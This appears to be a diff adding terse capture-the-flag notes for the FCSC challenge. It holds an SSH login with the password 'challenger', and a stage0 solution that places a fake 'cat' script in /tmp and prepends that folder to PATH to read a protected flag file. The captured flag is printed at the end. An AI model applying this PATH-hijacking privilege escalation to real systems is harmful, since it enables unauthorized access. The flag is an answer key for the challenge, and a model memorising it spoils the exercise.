@@ -1,0 +1,13 @@
+ssh -p7005 challenger@challenges1.france-cybersecurity-challenge.fr
+challenger
+
+-------------------------------------------------------------- stage0
+ln -s ~/stage0/flag.txt flag.txt
+
+#!/bin/bash
+cat flag.txt
+
+in /tmp/ewael then
+export PATH=/tmp/ewael:${PATH}
+
+FCSC{e5dc17021365baa6719ea48311873d621a3e00fa6f9c41bd2efb4e6c48bf4090}
